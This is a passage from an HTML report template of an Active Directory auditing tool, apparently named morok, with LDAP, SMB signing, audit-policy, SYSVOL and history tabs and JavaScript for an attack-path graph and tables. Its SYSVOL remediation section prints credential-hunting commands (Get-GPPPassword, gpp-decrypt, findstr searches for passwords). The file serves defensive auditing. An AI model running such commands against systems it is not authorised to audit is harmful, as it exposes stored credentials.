      <span class="badge {{if eq .Severity "Critical"}}badge-critical{{else if eq .Severity "High"}}badge-high{{else}}badge-medium{{end}}">{{.Severity}}</span>
      <span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span>
      <span style="margin-left:4px">{{.Title}}</span>
    </div>
    <div style="padding:8px 16px;color:var(--text-secondary);font-size:0.85rem">{{.Detail}}</div>
  </div>
  {{end}}
  {{else}}
  <p style="color:var(--color-ok)">✓ No LDAP security issues found.</p>
  {{end}}
  {{else}}
  <p style="color:var(--text-muted)">LDAP security data not available.</p>
  {{end}}

  {{if .SMBSigningResult}}
  <h3 class="section-title" style="font-size:0.95rem;margin-top:24px">SMB Signing (port 445)</h3>
  {{if .SMBSigningResult.Reachable}}
  <div class="table-wrap" style="margin-bottom:16px"><table>
    <thead><tr><th>Property</th><th>Value</th></tr></thead>
    <tbody>
      <tr>
        <td>Host</td>
        <td class="mono">{{.SMBSigningResult.Host}}</td>
      </tr>
      <tr>
        <td>Dialect</td>
        <td>{{dialectName .SMBSigningResult.Dialect}}</td>
      </tr>
      <tr>
        <td>Signing</td>
        <td>
          {{if .SMBSigningResult.SigningRequired}}<span class="badge" style="background:var(--bg-hover);color:var(--color-ok)">✓ required</span>
          {{else if .SMBSigningResult.SigningEnabled}}<span class="badge badge-medium">enabled (not required)</span>
          {{else}}<span class="badge badge-high">not enabled</span>{{end}}
        </td>
      </tr>
    </tbody>
  </table></div>
  {{if .SMBSigningResult.Findings}}
  {{range .SMBSigningResult.Findings}}
  <div class="path-card" style="margin-bottom:10px">
    <div class="path-header" style="flex-wrap:wrap;gap:8px">
      <span class="badge {{if eq .Severity "High"}}badge-high{{else if eq .Severity "Medium"}}badge-medium{{else}}badge-critical{{end}}">{{.Severity}}</span>
      <span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span>
      <span style="margin-left:4px">{{.Title}}</span>
    </div>
    <div style="padding:8px 16px;color:var(--text-secondary);font-size:0.85rem">{{.Detail}}</div>
  </div>
  {{end}}
  {{else}}
  <p style="color:var(--color-ok)">✓ SMB signing is required.</p>
  {{end}}
  {{else}}
  <p style="color:var(--text-muted)">Port 445 not reachable — SMB signing check skipped.</p>
  {{end}}
  {{end}}
</div>

<div id="tab-audit" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-audit" tabindex="0" aria-hidden="true">
  <h2 class="section-title">
    Audit Policy / Blue Team Visibility {{mitreBadges "audit_defense"}}
    <span class="help-icon" role="tooltip" tabindex="0" data-tip="Checks AD Recycle Bin status (deleted object recovery), legacy audit policy configuration (event log visibility), and machine account quota (RBCD abuse vector).">?</span>
  </h2>
  {{if .AuditResult}}
  <div class="table-wrap" style="margin-bottom:20px"><table>
    <thead><tr><th>Setting</th><th>Status</th></tr></thead>
    <tbody>
      <tr>
        <td>AD Recycle Bin</td>
        <td>
          {{if not .AuditResult.RecycleBinSupported}}
            <span class="badge" style="background:var(--bg-hover);color:var(--text-muted)">Not supported (forest FFL &lt; 2008 R2)</span>
          {{else if .AuditResult.RecycleBinEnabled}}
            <span class="badge" style="background:var(--bg-hover);color:var(--color-ok)">✓ Enabled</span>
          {{else}}
            <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary)">⚠ Disabled</span>
          {{end}}
        </td>
      </tr>
      <tr>
        <td>Legacy Audit Policy</td>
        <td>
          {{if .AuditResult.AuditingEnabled}}
            <span class="badge" style="background:var(--bg-hover);color:var(--color-ok)">✓ Configured</span>
          {{else}}
            <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary)">⚠ NOT configured</span>
          {{end}}
        </td>
      </tr>
      <tr>
        <td>Machine Account Quota</td>
        <td>
          {{if eq .AuditResult.MachineAccountQuota 0}}
            <span class="badge" style="background:var(--bg-hover);color:var(--color-ok)">0 — safe ✓</span>
          {{else}}
            <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary)">⚠ {{.AuditResult.MachineAccountQuota}} — any user can add computers</span>
          {{end}}
        </td>
      </tr>
    </tbody>
  </table></div>

  {{if .AuditResult.AuditingEnabled}}
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Audit Categories</div>
  <div class="table-wrap" style="margin-bottom:20px"><table>
    <thead><tr><th>Category</th><th>Success</th><th>Failure</th></tr></thead>
    <tbody>
      {{range .AuditResult.AuditCategories}}
      <tr>
        <td>{{.Name}}</td>
        <td>{{if .Success}}<span style="color:var(--color-ok)">✓</span>{{else}}<span style="color:var(--text-muted)">—</span>{{end}}</td>
        <td>{{if .Failure}}<span style="color:var(--color-ok)">✓</span>{{else}}<span style="color:var(--text-muted)">—</span>{{end}}</td>
      </tr>
      {{end}}
    </tbody>
  </table></div>
  {{end}}

  {{if .AuditResult.Findings}}
  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Findings</div>
  {{range .AuditResult.Findings}}
  <div class="path-card" style="margin-bottom:10px">
    <div class="path-header">
      <span class="badge {{if eq .Severity "High"}}badge-high{{else if eq .Severity "Medium"}}badge-medium{{else}}badge-critical{{end}}">{{.Severity}}</span>
      <span style="margin-left:8px">{{.Title}}</span>
    </div>
    <div style="padding:8px 16px;color:var(--text-secondary);font-size:0.85rem">{{.Detail}}</div>
  </div>
  {{end}}
  {{else}}
  <p style="color:var(--color-ok)">✓ No audit visibility issues found.</p>
  {{end}}
  {{else}}
  <p style="color:var(--text-muted)">Audit policy data not available.</p>
  {{end}}
</div>

<!-- SYSVOL AUDIT TAB -->
<div id="tab-sysvol" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-sysvol" tabindex="0" aria-hidden="true">
  <h2 class="section-title">SYSVOL Audit <span class="help-icon" role="tooltip" tabindex="0" data-tip="Scans the SYSVOL share for non-standard files without reading their content. Flags: GPP Preferences XML (potential cPassword, MS14-025), executables, archives, and script files outside standard Scripts\\ directories.">?</span></h2>

  {{if .SYSVOLResult}}
  {{if .SYSVOLResult.Error}}
  <p style="color:var(--text-muted)">SYSVOL not accessible — {{.SYSVOLResult.Error}}</p>
  {{else if not .SYSVOLResult.Scanned}}
  <p style="color:var(--text-muted)">SYSVOL scan was not performed.</p>
  {{else if not .SYSVOLResult.Findings}}
  <p style="color:var(--color-ok)">✓ No non-standard files found in SYSVOL.</p>
  {{else}}
  <p style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:16px">
    Found {{len .SYSVOLResult.Findings}} non-standard file(s). File contents were not read — inspect manually for credentials.
  </p>
  <div class="table-wrap">
  <table id="tbl-sysvol">
    <thead>
      <tr>
        <th>Path</th>
        <th>Type</th>
        <th>Size</th>
        <th>Severity</th>
        <th>Note</th>
      </tr>
    </thead>
    <tbody>
    {{range .SYSVOLResult.Findings}}
    <tr>
      <td class="mono" style="font-size:0.75rem;word-break:break-all">{{.Path}}</td>
      <td><span class="badge {{if eq .Severity "High"}}badge-high{{else}}badge-medium{{end}}" style="white-space:nowrap">{{.FileType}}</span></td>
      <td style="color:var(--text-muted)">{{.Size}} B</td>
      <td><span class="badge {{if eq .Severity "High"}}badge-high{{else}}badge-medium{{end}}">{{.Severity}}</span></td>
      <td style="color:var(--text-secondary);font-size:0.82rem">{{.Detail}}</td>
    </tr>
    {{end}}
    </tbody>
  </table>
  </div>

  <div class="exp-section" style="margin-top:20px">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Remediation</span>
    </div>
    <div class="exp-body" style="padding:16px">
      <p style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:8px">Check GPP Preferences XML files for cPassword:</p>
      <pre style="background:var(--bg-card);border:1px solid var(--border);border-radius:4px;padding:10px;font-size:0.78rem;color:var(--text-main);overflow-x:auto">Get-GPPPassword  # PowerSploit
python3 gpp-decrypt.py &lt;cpassword&gt;
findstr /S /I cpassword \\{{.SYSVOLResult.Domain}}\SYSVOL\*.xml</pre>
      <p style="color:var(--text-secondary);font-size:0.85rem;margin:12px 0 8px">Check scripts for hardcoded credentials:</p>
      <pre style="background:var(--bg-card);border:1px solid var(--border);border-radius:4px;padding:10px;font-size:0.78rem;color:var(--text-main);overflow-x:auto">findstr /S /I "password pass pwd secret" \\{{.SYSVOLResult.Domain}}\SYSVOL\*.ps1 *.bat *.cmd *.vbs</pre>
    </div>
  </div>
  {{end}}
  {{else}}
  <p style="color:var(--text-muted)">SYSVOL scan not available.</p>
  {{end}}
</div>

<div id="tab-history" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-history" tabindex="0" aria-hidden="true">
  <div style="padding:24px">
    <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:20px">
      <div>
        <h2 style="margin:0 0 4px;font-size:1.2rem">Remediation History</h2>
        <p style="margin:0;color:var(--text-muted);font-size:0.85rem">Load previous morok reports to track findings over time and measure remediation progress</p>
      </div>
      <label style="cursor:pointer">
        <input type="file" id="history-file-input" accept=".html" multiple style="display:none" onchange="loadHistoryFiles(this)">
        <span style="display:inline-flex;align-items:center;gap:8px;padding:8px 16px;background:var(--accent);color:#fff;border-radius:6px;font-size:0.875rem;font-weight:500;user-select:none">
          &#128194; Load baseline reports&#8230;
        </span>
      </label>
    </div>
    <div id="history-load-errors" style="display:none;padding:10px 14px;background:rgba(244,67,54,0.1);border:1px solid var(--sev-critical);border-radius:6px;color:var(--text-main);font-size:0.85rem;margin-bottom:12px"></div>
    <div id="history-domain-warning" style="display:none;padding:10px 14px;background:rgba(255,152,0,0.12);border:1px solid var(--sev-medium);border-radius:6px;color:var(--text-main);font-size:0.85rem;margin-bottom:16px"></div>
    <div id="history-empty" style="text-align:center;padding:60px 20px;color:var(--text-muted)">
      <div style="font-size:3rem;margin-bottom:12px">&#128202;</div>
      <div style="font-size:1rem;font-weight:500;margin-bottom:8px">No baseline reports loaded</div>
      <div style="font-size:0.85rem">Select one or more previous morok HTML reports to compare findings over time.<br>Use this tab for remediation tracking or drift detection.</div>
    </div>
    <div id="history-content" style="display:none">
      <div id="history-verdict" style="background:var(--bg-card);border:1px solid var(--border);border-left:4px solid var(--text-muted);border-radius:8px;padding:20px 24px;margin-bottom:24px"></div>
      <div id="history-summary-cards" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-bottom:28px"></div>
      <div style="margin-bottom:32px">
        <h3 style="font-size:1rem;font-weight:600;margin:0 0 12px">Timeline</h3>
        <div id="history-trend-chart" style="margin-bottom:16px"></div>
        <div style="overflow-x:auto">
          <table id="history-timeline-table" style="width:100%;border-collapse:collapse;font-size:0.85rem">
            <thead>
              <tr style="border-bottom:2px solid var(--border)">
                <th style="text-align:left;padding:8px 12px;color:var(--text-muted);font-weight:500">Date</th>
                <th style="text-align:left;padding:8px 12px;color:var(--text-muted);font-weight:500">Domain</th>
                <th style="text-align:center;padding:8px 12px;color:var(--text-muted);font-weight:500">Grade</th>
                <th style="text-align:center;padding:8px 12px;color:var(--text-muted);font-weight:500">Score</th>
                <th style="text-align:center;padding:8px 12px;color:var(--sev-critical);font-weight:500">Critical</th>
                <th style="text-align:center;padding:8px 12px;color:var(--sev-high);font-weight:500">High</th>
                <th style="text-align:center;padding:8px 12px;color:var(--sev-medium);font-weight:500">Medium</th>
              </tr>
            </thead>
            <tbody id="history-timeline-body"></tbody>
          </table>
        </div>
      </div>
      <div>
        <h3 style="font-size:1rem;font-weight:600;margin:0 0 4px">Findings Before &rarr; After</h3>
        <p id="history-findings-caption" style="margin:0 0 20px;font-size:0.8rem;color:var(--text-muted)"></p>
        <div id="history-bar-chart"></div>
      </div>
    </div>
  </div>
</div>

</div><!-- /content -->

<script>

// Findings chart
(function() {
  var chart = document.getElementById('findings-chart');
  if (!chart) return;

  var findings = [
    { label: 'Critical', color: 'var(--bar-sev-critical)', count: {{.TotalCritical}} },
    { label: 'High',     color: 'var(--bar-sev-high)',     count: {{.TotalHigh}} },
    { label: 'Medium',   color: 'var(--bar-sev-medium)',   count: {{.TotalMedium}} },
    { label: 'Info',     color: 'var(--accent)',             count: {{.Summary.TotalUsers}} + {{.Summary.TotalGroups}} + {{.Summary.TotalComputers}} }
  ];

  var max = Math.max.apply(null, findings.map(function(f){ return f.count; }));
  if (max === 0) max = 1;

  findings.forEach(function(f) {
    var pct = Math.round((f.count / max) * 100);
    var row = document.createElement('div');
    row.style.cssText = 'display:flex;align-items:center;gap:12px';
    row.innerHTML =
      '<div style="width:64px;font-size:12px;color:var(--text-muted);text-align:right;font-weight:500">' + f.label + '</div>' +
      '<div style="flex:1;background:var(--bg-hover);border-radius:4px;height:22px;overflow:hidden">' +
        '<div style="width:'+pct+'%;background:'+f.color+';height:100%;border-radius:4px;display:flex;align-items:center;padding-left:8px;transition:width .5s ease;min-width:'+(f.count > 0 ? '28px' : '0')+';">' +
          (f.count > 0 ? '<span style="font-size:11px;font-weight:600;color:var(--chart-count-txt);text-shadow:0 1px 2px rgba(0,0,0,.4)">'+f.count+'</span>' : '') +
        '</div>' +
      '</div>' +
      '<div style="width:36px;font-size:13px;font-weight:600;color:'+f.color+';text-align:right">'+f.count+'</div>';
    chart.appendChild(row);
  });
})();
// ============================================================
// Tab navigation
// ============================================================
function showTab(name) {
  document.querySelectorAll('.tab-pane').forEach(function(p) {
    p.classList.remove('active');
    p.setAttribute('aria-hidden', 'true');
  });
  document.querySelectorAll('.nav button').forEach(function(b) {
    b.classList.remove('active');
    b.setAttribute('aria-selected', 'false');
  });
  const pane = document.getElementById('tab-' + name);
  const btn  = document.getElementById('tab-btn-' + name);
  if (pane) { pane.classList.add('active'); pane.setAttribute('aria-hidden', 'false'); }
  if (btn)  { btn.classList.add('active');  btn.setAttribute('aria-selected', 'true'); }
  if (name === 'graph') initGraph();
}

function showTabByClick(e, name) {
  e.stopPropagation();
  document.querySelectorAll('.tab-pane').forEach(function(p) {
    p.classList.remove('active');
    p.setAttribute('aria-hidden', 'true');
  });
  document.querySelectorAll('.nav button').forEach(function(b) {
    b.classList.remove('active');
    b.setAttribute('aria-selected', 'false');
  });
  const pane = document.getElementById('tab-' + name);
  const btn  = document.getElementById('tab-btn-' + name);
  if (pane) { pane.classList.add('active'); pane.setAttribute('aria-hidden', 'false'); }
  if (btn)  { btn.classList.add('active');  btn.setAttribute('aria-selected', 'true'); }
  if (name === 'graph') initGraph();
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ============================================================
// Accordion toggle
// ============================================================
function toggleAcc(btn) {
  const body = btn.nextElementSibling;
  const open = body.classList.toggle('open');
  btn.setAttribute('aria-expanded', String(open));
  btn.innerHTML = btn.innerHTML.replace(/[▶▼]/, open ? '▼' : '▶');
}

// ============================================================
// D3.js attack path graph (improved)
// ============================================================
let graphInitialized = false;
let zoomBehavior = null;
let svgRoot = null;

function resetZoom() {
  if (svgRoot && zoomBehavior) {
    svgRoot.transition().duration(400).call(zoomBehavior.transform, d3.zoomIdentity);
  }
}

function initGraph() {
  if (graphInitialized) return;
  graphInitialized = true;

  const rawData = {{.GraphJSON}};
  if (!rawData.nodes || rawData.nodes.length === 0) {
    document.getElementById('graph-container').innerHTML =
      '<p style="padding:40px;color:var(--text-muted);text-align:center">No attack paths to visualize.</p>';
    return;
  }

  // Cap nodes: privileged groups + path nodes first, then fill up
  const MAX_NODES = 80;
  let data = rawData;
  let truncated = false;
  if (rawData.nodes.length > MAX_NODES) {
    truncated = true;
    const priv  = rawData.nodes.filter(n => n.type === 'group' || n.adminCount);
    const other = rawData.nodes.filter(n => n.type !== 'group' && !n.adminCount);
    const kept  = [...priv, ...other.slice(0, MAX_NODES - priv.length)];
    const keptIds = new Set(kept.map(n => n.id));
    data = {
      nodes: kept,
      edges: rawData.edges.filter(e => keptIds.has(e.source) && keptIds.has(e.target))
    };
  }

  // Count how many paths each node appears in (for sizing)
  const pathCount = {};
  data.nodes.forEach(n => { pathCount[n.id] = 0; });
  data.edges.forEach(e => {
    pathCount[e.source] = (pathCount[e.source] || 0) + 1;
    pathCount[e.target] = (pathCount[e.target] || 0) + 1;
  });
  const maxCount = Math.max(1, ...Object.values(pathCount));

  const container = document.getElementById('graph-container');
  const width = container.clientWidth;
  const height = container.clientHeight;

  // Show truncation warning
  if (truncated) {
    const warn = document.createElement('div');
    warn.className = 'graph-warn';
    warn.textContent = 'Graph truncated: showing ' + MAX_NODES + ' of ' + rawData.nodes.length + ' nodes — use --json for full export';
    container.appendChild(warn);
  }

  const svg = d3.select('#graph-svg');
  svgRoot = svg;

  // Arrow marker
  svg.append('defs').selectAll('marker').data(['arrow','arrow-admin']).enter()
    .append('marker')
    .attr('id', d => d)
    .attr('viewBox', '0 -5 10 10')
    .attr('refX', 28).attr('refY', 0)
    .attr('markerWidth', 5).attr('markerHeight', 5)
    .attr('orient', 'auto')
    .append('path')
    .attr('d', 'M0,-5L10,0L0,5')
    .attr('fill', (d, i) => i === 1 ? getComputedStyle(document.documentElement).getPropertyValue('--node-admin').trim() : '#4a5568');

  const g = svg.append('g');

  zoomBehavior = d3.zoom()
    .scaleExtent([0.2, 4])
    .on('zoom', e => g.attr('transform', e.transform));
  svg.call(zoomBehavior);

  // Simulation with stronger repulsion to prevent overlap
  const simulation = d3.forceSimulation(data.nodes)
    .force('link', d3.forceLink(data.edges).id(d => d.id).distance(150).strength(0.7))
    .force('charge', d3.forceManyBody().strength(-600))
    .force('center', d3.forceCenter(width / 2, height / 2))
    .force('collision', d3.forceCollide(d => nodeRadius(d, pathCount, maxCount) + 15));

  // Edges
  const link = g.append('g').attr('class', 'links').selectAll('line')
    .data(data.edges).enter().append('line')
    .attr('stroke', d => {
      const tgt = data.nodes.find(n => n.id === (d.target.id || d.target));
      return (tgt && tgt.adminCount) ? '#e53e3e' : '#4a5568';
    })
    .attr('stroke-opacity', 0.7)
    .attr('stroke-width', 2)
    .attr('marker-end', d => {
      const tgt = data.nodes.find(n => n.id === (d.target.id || d.target));
      return (tgt && tgt.adminCount) ? 'url(#arrow-admin)' : 'url(#arrow)';
    });

  // Edge type labels
  const edgeLabel = g.append('g').selectAll('text')
    .data(data.edges).enter().append('text')
    .attr('font-size', 9)
    .attr('fill', '#4a5568')
    .attr('text-anchor', 'middle')
    .text(d => d.type || '');

  // Node groups
  const tooltip = document.getElementById('graph-tooltip');

  const node = g.append('g').attr('class', 'nodes').selectAll('g')
    .data(data.nodes).enter().append('g')
    .on('mouseover', (e, d) => {
      const r = nodeRadius(d, pathCount, maxCount);
      tooltip.style.display = 'block';
      tooltip.innerHTML =
        '<div style="font-weight:600;color:var(--text-main);margin-bottom:4px">' + d.label + '</div>' +
        '<div style="color:var(--text-muted);font-size:0.75rem;word-break:break-all">' + d.id + '</div>' +
        '<div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap">' +
        (d.adminCount ? '<span class="badge badge-critical" style="padding:2px 6px;font-size:11px">Admin</span>' : '') +
        (d.kerberoastable ? '<span class="badge badge-medium" style="padding:2px 6px;font-size:11px">Kerberoastable</span>' : '') +
        (d.asrepRoastable ? '<span class="badge badge-high" style="padding:2px 6px;font-size:11px">AS-REP</span>' : '') +
        '<span style="background:var(--bg-hover);color:var(--text-secondary);padding:2px 6px;border-radius:3px;font-size:11px">' + d.type + '</span>' +
        '<span style="background:var(--bg-hover);color:var(--text-secondary);padding:2px 6px;border-radius:3px;font-size:11px">' + (pathCount[d.id]||0) + ' edge(s)</span>' +
        '</div>';
    })
    .on('mousemove', e => {
      const rect = container.getBoundingClientRect();
      let x = e.clientX - rect.left + 12, y = e.clientY - rect.top + 12;
      if (x + 290 > rect.width) x = e.clientX - rect.left - 290;
      tooltip.style.left = x + 'px';
      tooltip.style.top = y + 'px';
    })
    .on('mouseout', () => { tooltip.style.display = 'none'; })
    .call(d3.drag()
      .on('start', (e, d) => { if (!e.active) simulation.alphaTarget(0.3).restart(); d.fx=d.x; d.fy=d.y; })
      .on('drag',  (e, d) => { d.fx=e.x; d.fy=e.y; })
      .on('end',   (e, d) => { if (!e.active) simulation.alphaTarget(0); d.fx=null; d.fy=null; }));

  node.append('circle')
    .attr('r', d => nodeRadius(d, pathCount, maxCount))
    .attr('fill', d => nodeColor(d))
    .attr('stroke', d => {
      const s = getComputedStyle(document.documentElement);
      if (d.asrepRoastable || d.adminCount) return s.getPropertyValue('--node-admin').trim();
      return s.getPropertyValue('--border').trim();
    })
    .attr('stroke-width', d => d.adminCount || d.asrepRoastable ? 3 : 1.5)
    .attr('cursor', 'pointer');

  node.append('text')
    .attr('dy', d => nodeRadius(d, pathCount, maxCount) + 14)
    .attr('text-anchor', 'middle')
    .attr('font-size', 11)
    .style('fill', 'var(--text-main)')
    .attr('pointer-events', 'none')
    .text(d => d.label);

  simulation.on('tick', () => {
    link
      .attr('x1', d => d.source.x).attr('y1', d => d.source.y)
      .attr('x2', d => d.target.x).attr('y2', d => d.target.y);
    edgeLabel
      .attr('x', d => (d.source.x + d.target.x) / 2)
      .attr('y', d => (d.source.y + d.target.y) / 2 - 4);
    node.attr('transform', d => 'translate(' + d.x + ',' + d.y + ')');
  });
}

function nodeRadius(d, pathCount, maxCount) {
  const base = 16;
  const bonus = Math.round(((pathCount[d.id] || 0) / maxCount) * 10);
  return base + bonus;
}

function nodeColor(d) {
  const s = getComputedStyle(document.documentElement);
  const get = v => s.getPropertyValue(v).trim();
  if (d.adminCount)     return get('--node-admin');
  if (d.kerberoastable) return get('--text-sev-high');
  if (d.asrepRoastable) return get('--text-sev-critical');
  if (d.type === 'group')    return get('--node-group');
  if (d.type === 'computer') return get('--node-computer');
  return get('--node-user');
}

// ── Table sorting ─────────────────────────────────────────────
// Cycle: none → asc (▲) → desc (▼) → none (original order restored)
function sortTable(th) {
  const table = th.closest('table');
  if (table && table._dragOccurred) { table._dragOccurred = false; return; }
  const tbody = table.tBodies[0];
  const ths   = Array.from(th.closest('tr').querySelectorAll('th.sortable'));
  const col   = ths.indexOf(th);

  // save original order once per table
  if (!table._origOrder) {
    table._origOrder = Array.from(tbody.rows).map(r => r);
  }

  // determine next state: none→asc, asc→desc, desc→none
  const wasAsc  = th.classList.contains('sort-asc');
  const wasDesc = th.classList.contains('sort-desc');

  // reset all headers
  ths.forEach(h => h.classList.remove('sort-asc', 'sort-desc'));

  if (!wasAsc && !wasDesc) {
    // none → asc
    th.classList.add('sort-asc');
    const rows = Array.from(tbody.rows).sort((a, b) => cmp(a, b, col, true));
    rows.forEach(r => tbody.appendChild(r));
  } else if (wasAsc) {
    // asc → desc
    th.classList.add('sort-desc');
    const rows = Array.from(tbody.rows).sort((a, b) => cmp(a, b, col, false));
    rows.forEach(r => tbody.appendChild(r));
  } else {
    // desc → none: restore original order
    table._origOrder.forEach(r => tbody.appendChild(r));
  }
}

function cmp(a, b, col, asc) {
  const ta = a.cells[col]?.textContent?.trim() ?? '';
  const tb = b.cells[col]?.textContent?.trim() ?? '';
  const na = parseFloat(ta), nb = parseFloat(tb);
  if (!isNaN(na) && !isNaN(nb)) return asc ? na - nb : nb - na;
  return asc ? ta.localeCompare(tb) : tb.localeCompare(ta);
}

// ── Table filters ─────────────────────────────────────────────
// ── Highlight helpers ─────────────────────────────────────────
function highlightCell(cell, query) {
  // restore original innerHTML before re-highlighting
  if (cell._origHTML !== undefined) cell.innerHTML = cell._origHTML;
  else cell._origHTML = cell.innerHTML;
  if (!query) return;
  const re = new RegExp(query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi');
  // only walk text nodes to avoid breaking badge HTML
  const walker = document.createTreeWalker(cell, NodeFilter.SHOW_TEXT, null);
  const nodes = [];
  let n;
  while ((n = walker.nextNode())) nodes.push(n);
  nodes.forEach(tn => {
    if (!re.test(tn.textContent)) return;
    re.lastIndex = 0;
    const wrap = document.createElement('span');
    wrap.innerHTML = tn.textContent.replace(re,
      m => '<mark style="background:var(--mark-bg);color:var(--mark-txt);border-radius:2px;padding:0 1px">' + m + '</mark>');
    tn.parentNode.replaceChild(wrap, tn);
  });
}

function restoreCell(cell) {
  if (cell._origHTML !== undefined) {
    cell.innerHTML = cell._origHTML;
  }
}

// ── Table filters ─────────────────────────────────────────────
function filterTable(tableId, countId) {
  const table = document.getElementById(tableId);
  if (!table) return;
  const wrap = table.closest('.table-wrap');
  const bar  = wrap ? wrap.previousElementSibling : table.previousElementSibling;

  // single search input — searches ALL columns
  const searchInput = bar ? bar.querySelector('input[type=text]') : null;
  const query = searchInput ? searchInput.value.trim() : '';
  const queryLow = query.toLowerCase();

  // dropdown filters — still column-specific
  const selects = bar ? bar.querySelectorAll('select') : [];

  const rows = table.tBodies[0].rows;
  let visible = 0;

  for (const row of rows) {
    let show = true;

    // text: check against full row text
    if (queryLow && !row.textContent.toLowerCase().includes(queryLow)) show = false;

    // dropdowns
    if (show) {
      selects.forEach(sel => {
        if (!sel.value) return;
        const col  = parseInt(sel.dataset.col ?? '0');
        // data-also-col: additional columns to include in the match (comma-separated)
        const alsoStr = sel.dataset.alsoCol ?? '';
        const alsoCols = alsoStr ? alsoStr.split(',').map(Number) : [];
        let cell = row.cells[col]?.textContent?.trim() ?? '';
        for (const ac of alsoCols) {
          cell += '\x00' + (row.cells[ac]?.textContent?.trim() ?? '');
        }
        if (sel.dataset.match === 'exact') {
          if (cell !== sel.value) show = false;
        } else if (sel.dataset.match === 'notempty') {
          if (sel.value === '__notempty__') {
            if (cell === '' || cell === '—') show = false;
          } else {
            if (!cell.toLowerCase().includes(sel.value.toLowerCase())) show = false;
          }
        } else {
          if (!cell.toLowerCase().includes(sel.value.toLowerCase())) show = false;
        }
      });
    }

    row.style.display = show ? '' : 'none';
    if (show) visible++;

    // highlight / restore each cell
    Array.from(row.cells).forEach(cell => {
      if (show && queryLow) highlightCell(cell, query);
      else restoreCell(cell);
    });
  }

  if (countId) {
    const el = document.getElementById(countId);
    if (el) el.textContent = visible + ' / ' + rows.length;
  }
}

function clearFilters(tableId, countId) {
  const table = document.getElementById(tableId);
  if (!table) return;
  const wrap = table.closest('.table-wrap');
  const bar  = wrap ? wrap.previousElementSibling : table.previousElementSibling;
  if (bar) {
    bar.querySelectorAll('input[type=text]').forEach(i => i.value = '');
    bar.querySelectorAll('select').forEach(s => s.value = '');
  }
  filterTable(tableId, countId);
}

function filterACL() {
  const q        = (document.getElementById('acl-search')?.value   ?? '').toLowerCase();
  const severity = (document.getElementById('acl-severity')?.value ?? '');
  const right    = (document.getElementById('acl-right')?.value    ?? '');
  const domain   = (document.getElementById('acl-domain')?.value   ?? '');
  const cards    = document.querySelectorAll('#acl-findings .acl-card');
  let visible = 0;
  cards.forEach(card => {
    const text = (card.dataset.text ?? '').toLowerCase();
    const show =
      (!q        || text.includes(q)) &&
      (!severity || card.dataset.severity === severity) &&
      (!right    || card.dataset.right === right) &&
      (!domain   || card.dataset.domain === domain);
    card.dataset.filtered = show ? 'false' : 'true';
    if (show) visible++;
  });
  const cnt = document.getElementById('cnt-acl');
  if (cnt) cnt.textContent = visible + ' / ' + cards.length;
  buildGroupedACL();
}

// ── Global search ─────────────────────────────────────────────
// Searches all text in all tab-panes, highlights matches, shows result count.
// Global search state
let _gsMatches = []; // [{tabName, el, origHTML}]
let _gsTabCounts = {};

function gsHighlight(query) {
  // restore previous highlights
  _gsMatches.forEach(m => { if (m.el) m.el.innerHTML = m.origHTML; });
  _gsMatches = [];
  _gsTabCounts = {};

  const resultsEl = document.getElementById('gs-results');
  resultsEl.innerHTML = '';

  const q = query.trim();
  const clearBtn = document.getElementById('gs-clear');
  if (clearBtn) clearBtn.style.display = q ? '' : 'none';
  if (!q) return;

  const escaped = q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const re = new RegExp('(' + escaped + ')', 'gi');

  // walk all tab panes (including hidden ones) for text matches
  document.querySelectorAll('.tab-pane').forEach(pane => {
    const tabName = pane.id.replace('tab-', '');
    let count = 0;
    const walker = document.createTreeWalker(pane, NodeFilter.SHOW_TEXT, {
      acceptNode: n => {
        const p = n.parentElement;
        if (!p) return NodeFilter.FILTER_REJECT;
        const tag = p.tagName;
        if (tag === 'SCRIPT' || tag === 'STYLE') return NodeFilter.FILTER_REJECT;
        // Skip #acl-findings — it's display:none, content is mirrored in #acl-grouped
        if (p.closest && p.closest('#acl-findings')) return NodeFilter.FILTER_REJECT;
        if (!n.textContent.toLowerCase().includes(q.toLowerCase())) return NodeFilter.FILTER_SKIP;
        return NodeFilter.FILTER_ACCEPT;
      }
    });
    const nodes = [];
    while (walker.nextNode()) nodes.push(walker.currentNode);
    nodes.forEach(textNode => {
      const span = textNode.parentElement;
      if (!span || span.classList.contains('gs-match')) return;
      const orig = span.innerHTML;
      const highlighted = orig.replace(re, '<mark class="gs-match">$1</mark>');
      if (highlighted !== orig) {
        _gsMatches.push({ tabName, el: span, origHTML: orig });
        span.innerHTML = highlighted;
        count += (orig.match(re) || []).length;
      }
    });
    if (count > 0) _gsTabCounts[tabName] = count;
  });

  const total = Object.values(_gsTabCounts).reduce((a, b) => a + b, 0);

  if (total === 0) {
    resultsEl.innerHTML = '<span class="gs-no-match">no matches</span>';
    return;
  }

  // Build clickable tab buttons
  const tabLabels = {
    overview:'Overview', paths:'Paths', kerberos:'Kerberos', acl:'ACL',
    delegation:'Delegation', adcs:'ADCS', trust:'Trust', shadow:'Shadow',
    ldap:'LDAP', audit:'Audit', exposure:'Exposure', users:'Users',
    groups:'Groups', computers:'Computers', smb:'SMB', graph:'Graph'
  };
  Object.entries(_gsTabCounts)
    .sort((a, b) => b[1] - a[1])
    .forEach(([tab, cnt]) => {
      const label = tabLabels[tab] || tab;
